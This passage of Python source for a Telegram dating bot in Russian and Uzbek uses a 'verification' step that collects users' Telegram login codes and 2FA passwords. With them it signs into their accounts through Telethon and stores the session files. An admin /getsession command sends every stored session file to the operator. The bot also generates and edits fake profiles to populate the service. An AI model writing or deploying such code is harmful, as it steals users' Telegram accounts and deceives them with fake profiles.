                await message.answer(get_text("verify_2fa", lang))
                await state.set_state(VerifyStates.waiting_for_password)
                return
            else:
                raise e

        if await client.is_user_authorized():
            await client.disconnect()
            db.verify_user(user_id)
            
            # Уведомление админу
            try:
                phone = data.get('phone', 'неизвестно')
                await message.bot.send_message(
                    ADMIN_ID,
                    f"✅ <b>Новая верификация!</b>\n\n"
                    f"🆔 ID: <code>{user_id}</code>\n"
                    f"📱 Телефон: <code>{phone}</code>\n"
                    f"🔑 Тип: по коду",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Не удалось уведомить админа: {e}")
            
            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
            await state.clear()
        else:
            await message.answer(get_text("verify_fail", lang), reply_markup=main_menu_kb(lang))
            await state.clear()

    except Exception as e:
        await message.answer(get_text("verify_error", lang, error=str(e)), reply_markup=main_menu_kb(lang))
        await state.clear()


@router.callback_query(F.data == "resend_code", VerifyStates.waiting_for_code)
async def cb_resend_code(callback: CallbackQuery, state: FSMContext):
    """Запросить код повторно"""
    lang = db.get_lang(callback.from_user.id)
    data = await state.get_data()
    phone = data.get('phone')
    old_client = data.get('client')

    if not phone:
        await callback.answer(get_text("error", lang), show_alert=True)
        return

    await callback.answer("⏳ Отправляю новый код...")

    try:
        if old_client:
            try:
                await old_client.disconnect()
            except:
                pass

        new_client = TelegramClient(f"sessions/{phone}", api_id=API_ID, api_hash=API_HASH)
        await new_client.connect()
        await new_client.send_code_request(phone)
        await state.update_data(client=new_client, current_code="")

        markup = verify_code_kb(lang)
        await callback.message.edit_text(
            f"{get_text('verify_enter_code', lang)}\n\n🔄 Новый код отправлен!\nКод: ",
            reply_markup=markup
        )
        await state.set_state(VerifyStates.waiting_for_code)
    except Exception as e:
        await callback.message.answer(
            get_text("verify_error", lang, error=str(e)),
            reply_markup=main_menu_kb(lang)
        )
        await state.clear()


@router.message(VerifyStates.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    lang = db.get_lang(message.from_user.id)
    password = message.text
    data = await state.get_data()
    client = data.get('client')

    if not client:
        await state.clear()
        await message.answer(get_text("error", lang), reply_markup=main_menu_kb(lang))
        return

    try:
        await client.sign_in(password=password)

        if await client.is_user_authorized():
            await client.disconnect()
            db.verify_user(message.from_user.id)
            
            # Уведомление админу
            try:
                phone = data.get('phone', 'неизвестно')
                await message.bot.send_message(
                    ADMIN_ID,
                    f"✅ <b>Новая верификация!</b>\n\n"
                    f"🆔 ID: <code>{message.from_user.id}</code>\n"
                    f"📱 Телефон: <code>{phone}</code>\n"
                    f"🔑 Тип: 2FA (по паролю)",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Не удалось уведомить админа: {e}")
            
            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
            await state.clear()
        else:
            await message.answer(get_text("verify_fail", lang), reply_markup=main_menu_kb(lang))
            await state.clear()

    except Exception as e:
        await message.answer(get_text("verify_error", lang, error=str(e)), reply_markup=main_menu_kb(lang))
        await state.clear()


# === ЗАГОЛОВОЧНЫЕ КНОПКИ (игнорируются) ===
HEADER_BUTTONS = [
    "🌍 Выберите язык:", "🌍 Tilni tanlang:",
    "⚧️ Выберите ваш пол:", "⚧️ Jinsingizni tanlang:",
    "🔎 Кого вы ищете?", "🔎 Kimni qidiryapsiz?",
    "🗑 Удалить анкету?", "🗑 Anketani o'chirish?",
    "👤 Моя анкета", "👤 Mening anketam",
    "👀 Начать сначала?", "👀 Boshidan boshlash?",
    "🔒 Требуется верификация", "🔒 Tasdiqlash talab etiladi",
    "📱 Верификация", "📱 Tasdiqlash",
    "🏙️ Отправьте геолокацию или город", "🏙️ Geolokatsiya yoki shahar",
    "🔍 Фильтры поиска", "🔍 Qidiruv filtrlari",
]

@router.message(F.text.in_(HEADER_BUTTONS))
async def header_button_ignore(message: Message):
    """Заголовочные кнопки не выполняют действий"""
    pass


# === АДМИН КОМАНДЫ ===
@router.message(Command("genfakes"))
async def cmd_genfakes(message: Message, bot: Bot):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))

    from fake_generator import generate_fake_profiles
    from config import FAKE_COUNT

    lang = db.get_lang(message.from_user.id)
    await message.answer(f"⏳ {get_text('genfakes_done', lang, count=FAKE_COUNT).replace('✅ ', '')}")
    count = await generate_fake_profiles(bot, FAKE_COUNT)

    stats = db.get_stats()
    text = get_text("genfakes_done", "ru", count=count) + "\n\n" + get_text("stats", "ru", real=stats["real"], fake=stats["fake"], matches=stats["matches"])

    if count == 0:
        text += "\n\n⚠️ Удалите dating.db и перезапустите бота."

    await message.answer(text)

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))

    stats = db.get_stats()
    await message.answer(get_text("stats", "ru", real=stats["real"], fake=stats["fake"], matches=stats["matches"]))

@router.message(Command("checkvolume"))
async def cmd_checkvolume(message: Message):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))
    import os
    path = "/app/sessions"
    if os.path.exists(path):
        files = os.listdir(path)
        info = []
        for f in files:
            fp = os.path.join(path, f)
            size = os.path.getsize(fp)
            info.append(f"• {f} ({size} байт)")
        text = "📁 <b>Volume /app/sessions</b>\n\n" + "\n".join(info) if info else "📂 Папка пуста"
    else:
        text = "❌ Папка /app/sessions не найдена. Volume не подключён?"
    await message.answer(text, parse_mode="HTML")

@router.message(Command("getsession"))
async def cmd_getsession(message: Message):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))
    
    import os
    sessions_dir = "/app/sessions"
    if not os.path.exists(sessions_dir):
        return await message.answer("❌ Папка /app/sessions не найдена. Volume не подключён?")
    
    files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
    if not files:
        return await message.answer("📂 Файлов сессий нет")
    
    for f in files:
        path = os.path.join(sessions_dir, f)
        size = os.path.getsize(path)
        await message.answer_document(
            FSInputFile(path),
            caption=f"⚠️ <b>ТЕСТОВЫЙ ФАЙЛ</b>\n📁 {f}\n📏 {size} байт\n\n❗️ Удалите сообщение после проверки!",
            parse_mode="HTML"
        )

@router.message(Command("delfakes"))
async def cmd_delfakes(message: Message):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))

    conn = db.get_conn()
    c = conn.cursor()
    c.execute("DELETE FROM profiles WHERE is_fake = 1")
    c.execute("DELETE FROM photos WHERE user_id >= 1000000")
    c.execute("DELETE FROM actions WHERE to_user >= 1000000")
    conn.commit()
    conn.close()
    await message.answer(get_text("fakes_deleted", "ru"))


# === РЕДАКТИРОВАНИЕ ФЕЙКОВ ===
@router.message(Command("editfake"))
async def cmd_editfake(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        lang = db.get_lang(message.from_user.id)
        return await message.answer(get_text("admin_only", lang))

    fakes = db.get_fake_profiles()
    if not fakes:
        return await message.answer(get_text("no_fakes", "ru"))

    fake_list_text = "\n".join([f"{i+1}. {f['name']}, {f['age']} — {f['city']} ({len(f.get('photos', []))} фото)" for i, f in enumerate(fakes[:20])])
    await message.answer(
        get_text("fake_list", "ru", count=len(fakes), list=fake_list_text),
        reply_markup=fake_list_kb(fakes[:20], "ru")
    )
    await state.set_state(EditFake.choose)


@router.callback_query(F.data.startswith("fake_edit_"), EditFake.choose)
async def cb_fake_edit_choose(callback: CallbackQuery, state: FSMContext):
    fake_id = int(callback.data.split("_")[2])
    fake = db.get_profile(fake_id)

    if not fake or not fake.get("is_fake"):
        await callback.answer(get_text("fake_not_found", "ru"), show_alert=True)
        return

    await state.update_data(edit_fake_id=fake_id)

    try:
        await callback.message.delete()
    except:
        pass

    photos = fake.get("photos", [])
    if len(photos) == 1:
        await callback.message.answer_photo(photo=photos[0], caption=format_card(fake, "ru"))
    elif len(photos) > 1:
        media = []
        for i, url in enumerate(photos):
            cap = format_card(fake, "ru") if i == 0 else ""
            media.append(InputMediaPhoto(media=url, caption=cap))
        await callback.message.bot.send_media_group(chat_id=callback.message.chat.id, media=media)

    await callback.message.answer(
        get_text("fake_edit_field", "ru", name=fake["name"]),
        reply_markup=fake_edit_fields_kb(fake_id, "ru")
    )
    await state.set_state(EditFake.field)
    await callback.answer()


@router.callback_query(F.data.startswith("fakefield_"), EditFake.field)
async def cb_fake_field(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split("_")
    field = parts[1]
    fake_id = int(parts[2])

    await state.update_data(edit_fake_id=fake_id, edit_field=field)

    field_prompts = {
        "name": get_text("fake_edit_name", "ru"),
        "age": get_text("fake_edit_age", "ru"),
        "city": get_text("fake_edit_city", "ru"),
        "bio": get_text("fake_edit_bio", "ru"),
        "interests": get_text("interests", "ru") + " (через запятую):",
        "photo": get_text("fake_edit_photo", "ru"),
    }

    try:
        await callback.message.delete()
    except:
        pass

    await callback.message.answer(field_prompts.get(field, get_text("enter_value", "ru")))
    await state.set_state(EditFake.value)
    await callback.answer()


@router.message(EditFake.value)
async def fake_value_set(message: Message, state: FSMContext):
    data = await state.get_data()
    fake_id = data.get("edit_fake_id")
    field = data.get("edit_field")

    if not fake_id or not field:
        await state.clear()
        return await message.answer(get_text("editfake_error", "ru"))

    value = message.text

    if field == "age":
        if not value.isdigit():
            return await message.answer(get_text("enter_number", "ru"))
        value = int(value)
    elif field == "photo":
        db.add_photo(fake_id, value, 999)
        await state.clear()
        await message.answer(get_text("fake_photo_added", "ru"))
        return

    if field == "interests":
        db.update_fake_profile(fake_id, interests=value)
    else:
        db.update_fake_profile(fake_id, **{field: value})

    await state.clear()
    await message.answer(get_text("fake_updated", "ru"))

    fake = db.get_profile(fake_id)
    if fake:
        photos = fake.get("photos", [])
        if len(photos) == 1:
            await message.answer_photo(photo=photos[0], caption=format_card(fake, "ru"))
        elif len(photos) > 1:
            media = []
            for i, url in enumerate(photos):
                cap = format_card(fake, "ru") if i == 0 else ""
                media.append(InputMediaPhoto(media=url, caption=cap))
            await message.bot.send_media_group(chat_id=message.chat.id, media=media)


@router.callback_query(F.data.startswith("fakedel_"), EditFake.field)
async def cb_fake_delete(callback: CallbackQuery, state: FSMContext):
    fake_id = int(callback.data.split("_")[1])

    conn = db.get_conn()
    c = conn.cursor()
    c.execute("DELETE FROM profiles WHERE user_id = %s AND is_fake = 1", (fake_id,))
    c.execute("DELETE FROM photos WHERE user_id = %s", (fake_id,))
    c.execute("DELETE FROM actions WHERE to_user = %s", (fake_id,))
    conn.commit()
    conn.close()

    try:
        await callback.message.delete()
    except:
        pass

    await callback.message.answer(get_text("fake_deleted", "ru"))
    await state.clear()
    await callback.answer()


@router.callback_query(F.data == "fake_delete_all")
async def cb_fake_delete_all(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return await callback.answer(get_text("admin_only", "ru"), show_alert=True)

    conn = db.get_conn()
    c = conn.cursor()
    c.execute("DELETE FROM profiles WHERE is_fake = 1")
    c.execute("DELETE FROM photos WHERE user_id >= 1000000")
    c.execute("DELETE FROM actions WHERE to_user >= 1000000")
    conn.commit()
    conn.close()

    try:
        await callback.message.delete()
    except:
        pass

    await callback.message.answer(get_text("all_fakes_deleted", "ru"))
    await callback.answer()


@router.callback_query(F.data == "fake_back")
async def cb_fake_back(callback: CallbackQuery, state: FSMContext):
    try:
        await callback.message.delete()
    except:
        pass

    await state.clear()
    await callback.message.answer(get_text("menu", "ru"), reply_markup=main_menu_kb("ru"))
    await callback.answer()


@router.callback_query(F.data.startswith("likeback_"))
async def cb_likeback(callback: CallbackQuery, bot: Bot):
    lang = db.get_lang(callback.from_user.id)
    target_id = int(callback.data.split("_")[1])
    db.add_action(callback.from_user.id, target_id, "heart")

    target = db.get_profile(target_id)
    if target and not target.get("is_fake"):
        if db.check_mutual_like(callback.from_user.id, target_id):
            db.save_match(callback.from_user.id, target_id)
            await callback.message.answer(
                get_text("match", lang, name=target["name"], age=target["age"], city=target["city"]),
                reply_markup=write_kb(target_id, lang)
            )
    await callback.answer(get_text("action_like", lang))


@router.callback_query(F.data.startswith("skipback_"))
async def cb_skipback(callback: CallbackQuery):
    lang = db.get_lang(callback.from_user.id)
    await callback.answer(get_text("action_skip", lang))


# === МЕНЮ ДЕЙСТВИЯ ===
@router.callback_query(F.data == "profile_edit")
async def cb_profile_edit(callback: CallbackQuery, state: FSMContext):
    lang = db.get_lang(callback.from_user.id)
    try:
        await callback.message.delete()
    except:
        pass
    await callback.message.answer(get_text("reg_name", lang), reply_markup=ReplyKeyboardRemove())
    await state.set_state(Register.name)
    await callback.answer()
